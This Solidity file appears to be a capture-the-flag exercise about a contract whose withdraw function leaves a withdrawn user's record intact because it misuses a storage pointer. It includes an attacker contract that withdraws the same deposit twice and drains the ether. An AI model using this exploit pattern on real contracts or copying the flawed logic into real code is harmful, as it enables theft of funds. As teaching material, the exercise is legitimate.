pragma solidity 0.8.15;

/**
 * This contract starts with 1 ether.
 * Your goal is to steal all the ether in the contract.
 *
 */
import "hardhat/console.sol";

contract DeleteUser {
    struct User {
        address addr;
        uint256 amount;
    }

    User[] private users;

    function deposit() external payable {
        users.push(User({addr: msg.sender, amount: msg.value}));
    }

    function withdraw(uint256 index) external {
        User storage user = users[index];
        console.log(user.addr);
        console.log(user.amount);
        require(user.addr == msg.sender);

        uint256 amount = user.amount;

        user = users[users.length - 1];
        users.pop();

        msg.sender.call{value: amount}("");
    }
}

contract DeleteUserAttacker {
    address victim;

    constructor(address v) {
        victim = v;
    }

    function attack() public payable {
        DeleteUser(victim).deposit{value: 1 ether}();
        DeleteUser(victim).deposit{value: 0 ether}();
        DeleteUser(victim).withdraw(1);

        DeleteUser(victim).withdraw(1);
        msg.sender.call{value: address(this).balance}("");
    }

    receive() external payable {}
}
